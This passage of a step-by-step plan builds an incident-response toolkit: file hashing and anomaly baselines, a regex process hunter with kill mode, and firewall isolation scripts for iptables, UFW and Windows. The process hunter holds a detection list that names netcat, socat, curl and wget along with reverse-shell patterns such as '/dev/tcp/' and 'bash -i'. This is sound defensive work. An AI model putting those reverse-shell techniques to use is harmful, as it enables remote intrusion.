        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b'test')
            path = f.name
        try:
            h = compute_file_hash(path)
            self.assertEqual(len(h), 64)  # SHA256 hex length
        finally:
            os.unlink(path)

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test, expect FAIL**

**Step 3: Write implementation**

```python
# ir_scripts/utils/file_utils.py
"""File utilities for scanning and analyzing filesystem artifacts."""
import os
import stat
import hashlib
from datetime import datetime
from typing import Dict, List, Optional, Any

# Paths commonly used by attackers for payloads
LINUX_SUSPICIOUS_PATHS = [
    '/tmp',
    '/var/tmp',
    '/dev/shm',
    '/run/shm',
    '/var/www',
    '/var/www/html',
    '/opt',
    '/home',
    '/root',
    '/var/spool/cron',
    '/etc/cron.d',
    '/etc/cron.daily',
    '/etc/cron.hourly',
    '/etc/init.d',
    '/usr/local/bin',
    '/usr/local/sbin',
    '~/.ssh',
    '~/.bashrc',
    '~/.profile',
]

WINDOWS_SUSPICIOUS_PATHS = [
    'C:\\Temp',
    'C:\\Windows\\Temp',
    'C:\\Users\\Public',
    'C:\\ProgramData',
    'C:\\Windows\\Tasks',
    'C:\\Windows\\System32\\Tasks',
    '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
    '%USERPROFILE%\\Downloads',
]

SUSPICIOUS_EXTENSIONS = {
    '.exe', '.dll', '.scr', '.bat', '.cmd', '.ps1', '.vbs',
    '.js', '.jse', '.wsf', '.wsh', '.hta', '.pif', '.com',
    '.sh', '.elf', '.bin', '.py', '.pl', '.rb', '.php'
}

def compute_file_hash(path: str, algorithm: str = 'sha256') -> Optional[str]:
    """Compute hash of a file."""
    try:
        hasher = hashlib.new(algorithm)
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                hasher.update(chunk)
        return hasher.hexdigest()
    except (OSError, PermissionError):
        return None

def get_file_attributes(path: str) -> Optional[Dict[str, Any]]:
    """Extract comprehensive file attributes."""
    try:
        st = os.stat(path)
        return {
            'path': path,
            'name': os.path.basename(path),
            'size': st.st_size,
            'mode': stat.filemode(st.st_mode),
            'mode_octal': oct(st.st_mode)[-4:],
            'uid': st.st_uid,
            'gid': st.st_gid,
            'atime': datetime.fromtimestamp(st.st_atime).isoformat(),
            'mtime': datetime.fromtimestamp(st.st_mtime).isoformat(),
            'ctime': datetime.fromtimestamp(st.st_ctime).isoformat(),
            'inode': st.st_ino,
            'nlink': st.st_nlink,
            'is_executable': os.access(path, os.X_OK),
            'is_hidden': os.path.basename(path).startswith('.'),
            'extension': os.path.splitext(path)[1].lower(),
            'hash': compute_file_hash(path) if st.st_size < 50_000_000 else None,
        }
    except (OSError, PermissionError):
        return None

def scan_directory(path: str, recursive: bool = True, max_files: int = 10000) -> List[Dict]:
    """Scan directory and return file attributes."""
    files = []
    count = 0

    try:
        if recursive:
            for root, dirs, filenames in os.walk(path):
                for fname in filenames:
                    if count >= max_files:
                        return files
                    fpath = os.path.join(root, fname)
                    attrs = get_file_attributes(fpath)
                    if attrs:
                        files.append(attrs)
                        count += 1
        else:
            for fname in os.listdir(path):
                if count >= max_files:
                    break
                fpath = os.path.join(path, fname)
                if os.path.isfile(fpath):
                    attrs = get_file_attributes(fpath)
                    if attrs:
                        files.append(attrs)
                        count += 1
    except PermissionError:
        pass

    return files
```

**Step 4: Run test, expect PASS**

**Step 5: Commit**

```bash
git add ir_scripts/utils/file_utils.py tests/test_file_utils.py
git commit -m "feat: add file utilities for filesystem scanning"
```

---

### Task 2.2: Create File Anomaly Detection Script

**Files:**
- Create: `ir_scripts/file_anomaly.py`
- Test: `tests/test_file_anomaly.py`

**Step 1: Write failing test**

```python
# tests/test_file_anomaly.py
import unittest
import tempfile
import os
import json
from ir_scripts.file_anomaly import create_baseline, run_anomaly_scan

class TestFileAnomaly(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.baseline_path = os.path.join(self.temp_dir, 'file_baseline.json')
        # Create test file
        self.test_file = os.path.join(self.temp_dir, 'test.txt')
        with open(self.test_file, 'w') as f:
            f.write('test')

    def test_create_baseline(self):
        create_baseline(self.baseline_path, [self.temp_dir])
        self.assertTrue(os.path.exists(self.baseline_path))

    def test_detect_new_file(self):
        create_baseline(self.baseline_path, [self.temp_dir])
        # Add new file
        new_file = os.path.join(self.temp_dir, 'new_malware.sh')
        with open(new_file, 'w') as f:
            f.write('#!/bin/bash\nmalicious')
        results = run_anomaly_scan(self.baseline_path, [self.temp_dir])
        self.assertGreater(len(results.get('new', [])), 0)

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test, expect FAIL**

**Step 3: Write implementation**

```python
#!/usr/bin/env python3
# ir_scripts/file_anomaly.py
"""File Anomaly Detection for suspicious directories."""
import argparse
import json
import os
import platform
import sys
from datetime import datetime
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ir_scripts.utils.colors import (
    Colors, print_header, print_success, print_warning,
    print_error, print_info, print_anomaly
)
from ir_scripts.utils.file_utils import (
    scan_directory, LINUX_SUSPICIOUS_PATHS, WINDOWS_SUSPICIOUS_PATHS,
    SUSPICIOUS_EXTENSIONS
)

DEFAULT_BASELINE_DIR = os.path.join(os.path.dirname(__file__), 'baselines')

def get_default_paths() -> List[str]:
    """Get default suspicious paths for current platform."""
    if platform.system() == 'Windows':
        return [os.path.expandvars(p) for p in WINDOWS_SUSPICIOUS_PATHS]
    return [os.path.expanduser(p) for p in LINUX_SUSPICIOUS_PATHS]

def create_baseline(output_path: str, paths: List[str] = None) -> str:
    """Create file baseline for specified paths."""
    paths = paths or get_default_paths()
    print_header("Creating File Baseline")

    all_files = []
    for path in paths:
        if os.path.exists(path):
            print_info(f"Scanning: {path}")
            files = scan_directory(path, recursive=True)
            all_files.extend(files)

    baseline = {
        'timestamp': datetime.now().isoformat(),
        'hostname': platform.node(),
        'paths_scanned': paths,
        'total_files': len(all_files),
        'files': all_files
    }

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(baseline, f, indent=2)

    print_success(f"Baseline created: {output_path}")
    print_info(f"Total files recorded: {len(all_files)}")
    return output_path

def run_anomaly_scan(baseline_path: str, paths: List[str] = None) -> Dict:
    """Compare current files against baseline."""
    with open(baseline_path) as f:
        baseline = json.load(f)

    paths = paths or baseline.get('paths_scanned', get_default_paths())
    baseline_files = {f['path']: f for f in baseline.get('files', [])}

    current_files = []
    for path in paths:
        if os.path.exists(path):
            current_files.extend(scan_directory(path))

    current_by_path = {f['path']: f for f in current_files}

    new_files = []
    modified_files = []
    deleted_files = []

    # Find new and modified
    for path, attrs in current_by_path.items():
        if path not in baseline_files:
            new_files.append(attrs)
        else:
            base = baseline_files[path]
            if base.get('hash') != attrs.get('hash'):
                modified_files.append({'current': attrs, 'baseline': base})

    # Find deleted
    for path in baseline_files:
        if path not in current_by_path:
            deleted_files.append(baseline_files[path])

    return {
        'new': new_files,
        'modified': modified_files,
        'deleted': deleted_files,
        'baseline_info': {'timestamp': baseline.get('timestamp')}
    }

def display_anomalies(results: Dict) -> None:
    """Display file anomaly results."""
    print_header("File Anomaly Scan Results")

    new = results.get('new', [])
    modified = results.get('modified', [])
    deleted = results.get('deleted', [])

    if not (new or modified or deleted):
        print_success("No file anomalies detected!")
        return

    if new:
        print(f"\n{Colors.RED}=== NEW FILES ({len(new)}) ==={Colors.RESET}")
        for f in new[:50]:
            suspicious = f.get('extension') in SUSPICIOUS_EXTENSIONS
            color = Colors.RED if suspicious else Colors.YELLOW
            print(f"  {color}{f['path']}{Colors.RESET}")
            print(f"    Size: {f['size']} | Modified: {f['mtime']}")
            if f.get('is_executable'):
                print(f"    {Colors.RED}[EXECUTABLE]{Colors.RESET}")

    if modified:
        print(f"\n{Colors.MAGENTA}=== MODIFIED FILES ({len(modified)}) ==={Colors.RESET}")
        for item in modified[:30]:
            print(f"  {item['current']['path']}")
            print(f"    Hash changed: {item['baseline'].get('hash', 'N/A')[:16]}... -> {item['current'].get('hash', 'N/A')[:16]}...")

def main():
    parser = argparse.ArgumentParser(description='File Anomaly Detection')
    parser.add_argument('action', choices=['baseline', 'scan'])
    parser.add_argument('-b', '--baseline', default=os.path.join(DEFAULT_BASELINE_DIR, 'file_baseline.json'))
    parser.add_argument('-p', '--paths', nargs='+', help='Paths to scan')
    parser.add_argument('-o', '--output', help='Output results to file')

    args = parser.parse_args()

    if args.action == 'baseline':
        create_baseline(args.baseline, args.paths)
    else:
        results = run_anomaly_scan(args.baseline, args.paths)
        display_anomalies(results)
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)

if __name__ == '__main__':
    main()
```

**Step 4: Run test, expect PASS**

**Step 5: Commit**

```bash
git add ir_scripts/file_anomaly.py tests/test_file_anomaly.py
git commit -m "feat: add file anomaly detection script"
```

---

## Script 3: Process Hunter

### Task 3.1: Create Process Hunter Script

**Files:**
- Create: `ir_scripts/process_hunter.py`
- Test: `tests/test_process_hunter.py`

**Step 1: Write failing test**

```python
# tests/test_process_hunter.py
import unittest
from ir_scripts.process_hunter import search_processes, format_process_details

class TestProcessHunter(unittest.TestCase):
    def test_search_processes_with_regex(self):
        # Search for bash or sh - should find at least one
        results = search_processes(r'(ba)?sh')
        self.assertIsInstance(results, list)

    def test_search_processes_returns_attributes(self):
        results = search_processes('.*')  # Match all
        if results:
            proc = results[0]
            self.assertIn('pid', proc)
            self.assertIn('name', proc)

    def test_format_process_details_returns_string(self):
        mock_proc = {'pid': 1, 'name': 'test', 'ppid': 0, 'username': 'root'}
        output = format_process_details(mock_proc)
        self.assertIsInstance(output, str)

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run test, expect FAIL**

**Step 3: Write implementation**

```python
#!/usr/bin/env python3
# ir_scripts/process_hunter.py
"""
Process Hunter - Search and optionally kill processes by regex pattern.

Features:
- Regex-based process name/cmdline search
- Detailed process information for threat hunting
- Interactive kill option with confirmation
- Suspicious indicator highlighting
"""
import argparse
import os
import re
import signal
import sys
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ir_scripts.utils.colors import (
    Colors, print_header, print_success, print_warning,
    print_error, print_info
)
from ir_scripts.utils.process_utils import get_all_processes

# Suspicious indicators for threat hunting
SUSPICIOUS_INDICATORS = {
    'paths': ['/tmp/', '/dev/shm/', '/var/tmp/', '/.'],
    'names': ['nc', 'ncat', 'netcat', 'socat', 'curl', 'wget', 'python', 'perl', 'ruby', 'php'],
    'cmdline_patterns': [
        r'-e\s*/bin/(ba)?sh',  # Reverse shell
        r'bash\s+-i',          # Interactive bash
        r'/dev/tcp/',          # Bash reverse shell
        r'base64.*decode',     # Encoded payload
        r'eval.*\$',           # Code execution
    ]
}

def check_suspicious(proc: Dict) -> List[str]:
    """Check process for suspicious indicators."""
    indicators = []
    exe = proc.get('exe') or ''
    cmdline = proc.get('cmdline') or ''
    name = proc.get('name') or ''

    for path in SUSPICIOUS_INDICATORS['paths']:
        if path in exe:
            indicators.append(f"Suspicious path: {path}")

    if name.lower() in SUSPICIOUS_INDICATORS['names']:
        indicators.append(f"Network/scripting tool: {name}")

    for pattern in SUSPICIOUS_INDICATORS['cmdline_patterns']:
        if re.search(pattern, cmdline, re.IGNORECASE):
            indicators.append(f"Suspicious cmdline pattern detected")
            break

    if proc.get('connections'):
        indicators.append(f"Has {len(proc['connections'])} network connection(s)")

    return indicators

def search_processes(pattern: str, search_cmdline: bool = True) -> List[Dict]:
    """Search processes matching regex pattern."""
    try:
        regex = re.compile(pattern, re.IGNORECASE)
    except re.error as e:
        print_error(f"Invalid regex: {e}")
        return []

    processes = get_all_processes()
    matches = []

    for proc in processes:
        name = proc.get('name') or ''
        cmdline = proc.get('cmdline') or ''

        if regex.search(name):
            proc['suspicious_indicators'] = check_suspicious(proc)
            matches.append(proc)
        elif search_cmdline and regex.search(cmdline):
            proc['suspicious_indicators'] = check_suspicious(proc)
            matches.append(proc)

    return matches

def format_process_details(proc: Dict) -> str:
    """Format process details for display."""
    lines = []
    lines.append(f"  {Colors.CYAN}PID:{Colors.RESET}        {proc.get('pid')}")
    lines.append(f"  {Colors.CYAN}Name:{Colors.RESET}       {proc.get('name')}")
    lines.append(f"  {Colors.CYAN}PPID:{Colors.RESET}       {proc.get('ppid')}")
    lines.append(f"  {Colors.CYAN}User:{Colors.RESET}       {proc.get('username')}")
    lines.append(f"  {Colors.CYAN}Exe:{Colors.RESET}        {proc.get('exe')}")
    lines.append(f"  {Colors.CYAN}Cmdline:{Colors.RESET}    {(proc.get('cmdline') or '')[:100]}")
    lines.append(f"  {Colors.CYAN}Created:{Colors.RESET}    {proc.get('create_time')}")
    lines.append(f"  {Colors.CYAN}CPU%:{Colors.RESET}       {proc.get('cpu_percent')}")
    lines.append(f"  {Colors.CYAN}Mem%:{Colors.RESET}       {proc.get('memory_percent')}")
    lines.append(f"  {Colors.CYAN}Status:{Colors.RESET}     {proc.get('status')}")

    if proc.get('exe_hash'):
        lines.append(f"  {Colors.CYAN}Hash:{Colors.RESET}       {proc.get('exe_hash')}")

    if proc.get('connections'):
        lines.append(f"  {Colors.CYAN}Network:{Colors.RESET}")
        for conn in proc['connections'][:5]:
            lines.append(f"              {conn.get('laddr')} -> {conn.get('raddr')} ({conn.get('status')})")

    indicators = proc.get('suspicious_indicators', [])
    if indicators:
        lines.append(f"  {Colors.RED}SUSPICIOUS:{Colors.RESET}")
        for ind in indicators:
            lines.append(f"    {Colors.RED}! {ind}{Colors.RESET}")

    return '\n'.join(lines)

def kill_process(pid: int, force: bool = False) -> bool:
    """Kill a process by PID."""
    try:
        sig = signal.SIGKILL if force else signal.SIGTERM
        os.kill(pid, sig)
        return True
    except (OSError, PermissionError) as e:
        print_error(f"Failed to kill PID {pid}: {e}")
        return False

def interactive_kill(processes: List[Dict]) -> None:
    """Interactive mode to select and kill processes."""
    print(f"\n{Colors.YELLOW}Enter PID to kill (or 'q' to quit, 'all' to kill all):{Colors.RESET}")

    while True:
        choice = input(f"{Colors.CYAN}> {Colors.RESET}").strip()

        if choice.lower() == 'q':
            break
        elif choice.lower() == 'all':
            confirm = input(f"{Colors.RED}Kill ALL {len(processes)} processes? (yes/no): {Colors.RESET}")
            if confirm.lower() == 'yes':
                for proc in processes:
                    kill_process(proc['pid'])
                print_success("All processes killed")
            break
        else:
            try:
                pid = int(choice)
                if any(p['pid'] == pid for p in processes):
                    force = input("Force kill (SIGKILL)? (y/n): ").lower() == 'y'
                    if kill_process(pid, force):
                        print_success(f"Process {pid} killed")
                else:
                    print_warning(f"PID {pid} not in search results")
            except ValueError:
                print_error("Invalid input")

def main():
    parser = argparse.ArgumentParser(
        description='Hunt and optionally kill processes by regex pattern',
        epilog='Example: %(prog)s "nc|netcat" --kill'
    )
    parser.add_argument('pattern', help='Regex pattern to search')
    parser.add_argument('-c', '--cmdline', action='store_true', default=True,
                        help='Search in command line (default: True)')
    parser.add_argument('-k', '--kill', action='store_true',
                        help='Enable interactive kill mode')
    parser.add_argument('-o', '--output', help='Save results to JSON')

    args = parser.parse_args()

    print_header(f"Process Hunter - Searching: {args.pattern}")

    results = search_processes(args.pattern, args.cmdline)

    if not results:
        print_info("No matching processes found")
        return

    print_success(f"Found {len(results)} matching process(es)\n")

    for proc in results:
        has_suspicious = bool(proc.get('suspicious_indicators'))
        marker = f"{Colors.RED}[!]{Colors.RESET}" if has_suspicious else f"{Colors.GREEN}[*]{Colors.RESET}"
        print(f"\n{marker} {'='*50}")
        print(format_process_details(proc))

    if args.kill:
        interactive_kill(results)

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print_success(f"Results saved to {args.output}")

if __name__ == '__main__':
    main()
```

**Step 4: Run test, expect PASS**

**Step 5: Commit**

```bash
git add ir_scripts/process_hunter.py tests/test_process_hunter.py
git commit -m "feat: add process hunter with regex search and kill"
```

---

## Script 4: Network Isolation (Linux - iptables)

### Task 4.1: Create iptables Network Isolation Script

**Files:**
- Create: `network_isolation/linux/network_isolate_iptables.sh`

**Step 1: Write implementation**

```bash
#!/bin/bash
# network_isolate_iptables.sh - Network isolation using iptables
# For incident response - block/allow ports and services

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_header() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}========================================${NC}\n"
}

print_info() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_error() { echo -e "${RED}[-] $1${NC}"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root"
        exit 1
    fi
}

show_menu() {
    print_header "Network Isolation Tool (iptables)"
    echo "1. Show current iptables rules"
    echo "2. Show open ports and services"
    echo "3. Block a specific port"
    echo "4. Block a specific IP address"
    echo "5. Allow a specific port"
    echo "6. Allow a specific IP address"
    echo "7. Block all incoming traffic (emergency isolation)"
    echo "8. Block all outgoing traffic (emergency isolation)"
    echo "9. Reset iptables (allow all)"
    echo "10. Take down network interface"
    echo "11. Bring up network interface"
    echo "12. Show network interfaces"
    echo "0. Exit"
    echo ""
    read -p "Select option: " choice
}

show_rules() {
    print_header "Current iptables Rules"
    iptables -L -n -v --line-numbers
}

show_ports() {
    print_header "Open Ports and Services"
    echo -e "${YELLOW}TCP Listening:${NC}"
    ss -tlnp 2>/dev/null | column -t
    echo -e "\n${YELLOW}UDP Listening:${NC}"
    ss -ulnp 2>/dev/null | column -t
    echo -e "\n${YELLOW}Established Connections:${NC}"
    ss -tnp state established 2>/dev/null | head -20
}

block_port() {
    read -p "Enter port number to block: " port
    read -p "Protocol (tcp/udp/both) [both]: " proto
    proto=${proto:-both}
    read -p "Direction (in/out/both) [both]: " direction
    direction=${direction:-both}

    if [[ "$direction" == "in" || "$direction" == "both" ]]; then
        if [[ "$proto" == "tcp" || "$proto" == "both" ]]; then
            iptables -A INPUT -p tcp --dport "$port" -j DROP
            print_success "Blocked incoming TCP port $port"
        fi
        if [[ "$proto" == "udp" || "$proto" == "both" ]]; then
            iptables -A INPUT -p udp --dport "$port" -j DROP
            print_success "Blocked incoming UDP port $port"
        fi
    fi

    if [[ "$direction" == "out" || "$direction" == "both" ]]; then
        if [[ "$proto" == "tcp" || "$proto" == "both" ]]; then
            iptables -A OUTPUT -p tcp --dport "$port" -j DROP
            print_success "Blocked outgoing TCP port $port"
        fi
        if [[ "$proto" == "udp" || "$proto" == "both" ]]; then
            iptables -A OUTPUT -p udp --dport "$port" -j DROP
            print_success "Blocked outgoing UDP port $port"
        fi
    fi
}

block_ip() {
    read -p "Enter IP address to block: " ip
    read -p "Direction (in/out/both) [both]: " direction
    direction=${direction:-both}

    if [[ "$direction" == "in" || "$direction" == "both" ]]; then
        iptables -A INPUT -s "$ip" -j DROP
        print_success "Blocked incoming from $ip"
    fi
    if [[ "$direction" == "out" || "$direction" == "both" ]]; then
        iptables -A OUTPUT -d "$ip" -j DROP
        print_success "Blocked outgoing to $ip"
    fi
}

allow_port() {
    read -p "Enter port number to allow: " port
    read -p "Protocol (tcp/udp/both) [tcp]: " proto
    proto=${proto:-tcp}

    # Remove DROP rules and add ACCEPT
    if [[ "$proto" == "tcp" || "$proto" == "both" ]]; then
        iptables -D INPUT -p tcp --dport "$port" -j DROP 2>/dev/null || true
        iptables -I INPUT -p tcp --dport "$port" -j ACCEPT
        print_success "Allowed TCP port $port"
    fi
    if [[ "$proto" == "udp" || "$proto" == "both" ]]; then
        iptables -D INPUT -p udp --dport "$port" -j DROP 2>/dev/null || true
        iptables -I INPUT -p udp --dport "$port" -j ACCEPT
        print_success "Allowed UDP port $port"
    fi
}

allow_ip() {
    read -p "Enter IP address to allow: " ip
    iptables -D INPUT -s "$ip" -j DROP 2>/dev/null || true
    iptables -D OUTPUT -d "$ip" -j DROP 2>/dev/null || true
    iptables -I INPUT -s "$ip" -j ACCEPT
    iptables -I OUTPUT -d "$ip" -j ACCEPT
    print_success "Allowed traffic to/from $ip"
}

block_all_incoming() {
    print_warning "This will block ALL incoming connections!"
    read -p "Are you sure? (yes/no): " confirm
    if [[ "$confirm" == "yes" ]]; then
        iptables -P INPUT DROP
        iptables -A INPUT -i lo -j ACCEPT
        iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
        print_success "All incoming traffic blocked (except established)"
    fi
}

block_all_outgoing() {
    print_warning "This will block ALL outgoing connections!"
    read -p "Are you sure? (yes/no): " confirm
    if [[ "$confirm" == "yes" ]]; then
        iptables -P OUTPUT DROP
        iptables -A OUTPUT -o lo -j ACCEPT
        iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
        print_success "All outgoing traffic blocked (except established)"
    fi
}

reset_iptables() {
    print_warning "This will reset all iptables rules!"
    read -p "Are you sure? (yes/no): " confirm
    if [[ "$confirm" == "yes" ]]; then
        iptables -F
        iptables -X
        iptables -P INPUT ACCEPT
        iptables -P FORWARD ACCEPT
        iptables -P OUTPUT ACCEPT
        print_success "iptables reset to default (allow all)"
    fi
}

show_interfaces() {
    print_header "Network Interfaces"
    ip link show
    echo ""
    ip addr show
}

interface_down() {
    show_interfaces
    read -p "Enter interface name to disable: " iface
    print_warning "Taking down interface $iface"
    ip link set dev "$iface" down
    print_success "Interface $iface is now DOWN"
}

interface_up() {
    show_interfaces
    read -p "Enter interface name to enable: " iface
    ip link set dev "$iface" up
    print_success "Interface $iface is now UP"
}

main() {
    check_root

    while true; do
        show_menu
        case $choice in
            1) show_rules ;;
            2) show_ports ;;
            3) block_port ;;
            4) block_ip ;;
            5) allow_port ;;
            6) allow_ip ;;
            7) block_all_incoming ;;
            8) block_all_outgoing ;;
            9) reset_iptables ;;
            10) interface_down ;;
            11) interface_up ;;
            12) show_interfaces ;;
            0) print_info "Exiting"; exit 0 ;;
            *) print_error "Invalid option" ;;
        esac
        echo ""
        read -p "Press Enter to continue..."
    done
}

main
```

**Step 2: Make executable and commit**

```bash
chmod +x network_isolation/linux/network_isolate_iptables.sh
git add network_isolation/linux/network_isolate_iptables.sh
git commit -m "feat: add iptables network isolation script"
```

---

### Task 4.2: Create UFW Network Isolation Script

**Files:**
- Create: `network_isolation/linux/network_isolate_ufw.sh`

**Step 1: Write implementation**

```bash
#!/bin/bash
# network_isolate_ufw.sh - Network isolation using UFW
# Simplified firewall management for incident response

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_header() { echo -e "\n${CYAN}======== $1 ========${NC}\n"; }
print_info() { echo -e "${BLUE}[*] $1${NC}"; }
print_success() { echo -e "${GREEN}[+] $1${NC}"; }
print_warning() { echo -e "${YELLOW}[!] $1${NC}"; }
print_error() { echo -e "${RED}[-] $1${NC}"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script must be run as root"
        exit 1
    fi
}

check_ufw() {
    if ! command -v ufw &> /dev/null; then
        print_error "UFW is not installed. Install with: apt install ufw"
        exit 1
    fi
}

show_menu() {
    print_header "Network Isolation Tool (UFW)"
    echo "1. Show UFW status and rules"
    echo "2. Show open ports and services"
    echo "3. Enable UFW"
    echo "4. Disable UFW"
    echo "5. Block a specific port"
    echo "6. Block a specific IP address"
    echo "7. Allow a specific port"
    echo "8. Allow a specific IP address"
    echo "9. Delete a rule"
    echo "10. Reset UFW (remove all rules)"
    echo "11. Enable default deny incoming"
    echo "12. Enable default deny outgoing"
    echo "13. Take down network interface"
    echo "14. Bring up network interface"
    echo "0. Exit"
    echo ""
    read -p "Select option: " choice
}

show_status() {
    print_header "UFW Status"
    ufw status verbose
    echo ""
    ufw status numbered
}

show_ports() {
    print_header "Open Ports and Services"
    ss -tlnp 2>/dev/null
    echo ""
    ss -ulnp 2>/dev/null
}

enable_ufw() {
    print_warning "Enabling UFW firewall"
    ufw --force enable
    print_success "UFW enabled"
}

disable_ufw() {
    ufw disable
    print_success "UFW disabled"
}

block_port() {
    read -p "Enter port number to block: " port
    read -p "Protocol (tcp/udp/any) [any]: " proto
    proto=${proto:-any}

    if [[ "$proto" == "any" ]]; then
        ufw deny "$port"
    else
        ufw deny "$port/$proto"
    fi
    print_success "Blocked port $port"
}

block_ip() {
    read -p "Enter IP address to block: " ip
    ufw deny from "$ip"
    ufw deny to "$ip"
    print_success "Blocked IP $ip"
}

allow_port() {
    read -p "Enter port number to allow: " port
    read -p "Protocol (tcp/udp/any) [any]: " proto
    proto=${proto:-any}

    if [[ "$proto" == "any" ]]; then
        ufw allow "$port"
    else
        ufw allow "$port/$proto"
    fi
    print_success "Allowed port $port"
}

allow_ip() {
    read -p "Enter IP address to allow: " ip
    ufw allow from "$ip"
    ufw allow to "$ip"
    print_success "Allowed IP $ip"
}

delete_rule() {
    ufw status numbered
    read -p "Enter rule number to delete: " num
    ufw delete "$num"
    print_success "Rule deleted"
}

reset_ufw() {
    print_warning "This will reset all UFW rules!"
    read -p "Are you sure? (yes/no): " confirm
    if [[ "$confirm" == "yes" ]]; then
        ufw --force reset
        print_success "UFW reset"
    fi
}

default_deny_in() {
    ufw default deny incoming
    print_success "Default policy: deny incoming"
}

default_deny_out() {
    ufw default deny outgoing
    print_success "Default policy: deny outgoing"
}

interface_down() {
    ip link show
    read -p "Enter interface name to disable: " iface
    ip link set dev "$iface" down
    print_success "Interface $iface is DOWN"
}

interface_up() {
    ip link show
    read -p "Enter interface name to enable: " iface
    ip link set dev "$iface" up
    print_success "Interface $iface is UP"
}

main() {
    check_root
    check_ufw

    while true; do
        show_menu
        case $choice in
            1) show_status ;;
            2) show_ports ;;
            3) enable_ufw ;;
            4) disable_ufw ;;
            5) block_port ;;
            6) block_ip ;;
            7) allow_port ;;
            8) allow_ip ;;
            9) delete_rule ;;
            10) reset_ufw ;;
            11) default_deny_in ;;
            12) default_deny_out ;;
            13) interface_down ;;
            14) interface_up ;;
            0) exit 0 ;;
            *) print_error "Invalid option" ;;
        esac
        read -p "Press Enter to continue..."
    done
}

main
```

**Step 2: Make executable and commit**

```bash
chmod +x network_isolation/linux/network_isolate_ufw.sh
git add network_isolation/linux/network_isolate_ufw.sh
git commit -m "feat: add UFW network isolation script"
```

---

### Task 4.3: Create Windows PowerShell Network Isolation Script

**Files:**
- Create: `network_isolation/windows/network_isolate.ps1`

**Step 1: Write implementation**

```powershell
# network_isolate.ps1 - Network isolation using Windows Firewall (netsh advfirewall)
# For incident response on Windows endpoints

#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"

function Write-Header { param($text) Write-Host "`n======== $text ========`n" -ForegroundColor Cyan }
function Write-Info { param($text) Write-Host "[*] $text" -ForegroundColor Blue }
function Write-Success { param($text) Write-Host "[+] $text" -ForegroundColor Green }
function Write-Warn { param($text) Write-Host "[!] $text" -ForegroundColor Yellow }
function Write-Err { param($text) Write-Host "[-] $text" -ForegroundColor Red }

function Show-Menu {
    Write-Header "Network Isolation Tool (Windows Firewall)"
    Write-Host "1.  Show firewall status and profiles"
    Write-Host "2.  Show open ports and connections"
    Write-Host "3.  Enable Windows Firewall (all profiles)"
    Write-Host "4.  Disable Windows Firewall (all profiles)"
    Write-Host "5.  Block a specific port (inbound)"
    Write-Host "6.  Block a specific port (outbound)"
    Write-Host "7.  Block a specific IP address"
    Write-Host "8.  Allow a specific port"
    Write-Host "9.  Allow a specific IP address"
    Write-Host "10. Delete a firewall rule"
    Write-Host "11. Block all inbound (emergency isolation)"
    Write-Host "12. Block all outbound (emergency isolation)"
    Write-Host "13. Reset firewall to defaults"
    Write-Host "14. Disable network adapter"
    Write-Host "15. Enable network adapter"
    Write-Host "16. Show network adapters"
    Write-Host "0.  Exit"
    Write-Host ""
    $choice = Read-Host "Select option"
    return $choice
}

function Show-FirewallStatus {
    Write-Header "Firewall Status"
    netsh advfirewall show allprofiles
    Write-Host "`nFirewall Rules (first 20):" -ForegroundColor Yellow
    netsh advfirewall firewall show rule name=all | Select-Object -First 60
}

function Show-OpenPorts {
    Write-Header "Open Ports and Connections"
    Write-Host "Listening Ports:" -ForegroundColor Yellow
    netstat -an | Select-String "LISTENING"
    Write-Host "`nEstablished Connections:" -ForegroundColor Yellow
    netstat -an | Select-String "ESTABLISHED"
    Write-Host "`nWith Process Info:" -ForegroundColor Yellow
    Get-NetTCPConnection | Where-Object State -eq 'Listen' |
        Select-Object LocalAddress, LocalPort, OwningProcess |
        Format-Table -AutoSize
}

function Enable-Firewall {
    netsh advfirewall set allprofiles state on
    Write-Success "Windows Firewall enabled on all profiles"
}

function Disable-Firewall {
    Write-Warn "Disabling firewall on all profiles!"
    $confirm = Read-Host "Are you sure? (yes/no)"
    if ($confirm -eq "yes") {
        netsh advfirewall set allprofiles state off
        Write-Success "Windows Firewall disabled"
    }
}

function Block-Port-Inbound {
    $port = Read-Host "Enter port number to block"
    $proto = Read-Host "Protocol (tcp/udp) [tcp]"
    if ([string]::IsNullOrEmpty($proto)) { $proto = "tcp" }
    $ruleName = "IR_Block_Inbound_${proto}_${port}"

    netsh advfirewall firewall add rule name="$ruleName" `
        dir=in action=block protocol=$proto localport=$port

    Write-Success "Blocked inbound $proto port $port"
}

function Block-Port-Outbound {
    $port = Read-Host "Enter port number to block"
    $proto = Read-Host "Protocol (tcp/udp) [tcp]"
    if ([string]::IsNullOrEmpty($proto)) { $proto = "tcp" }
    $ruleName = "IR_Block_Outbound_${proto}_${port}"

    netsh advfirewall firewall add rule name="$ruleName" `
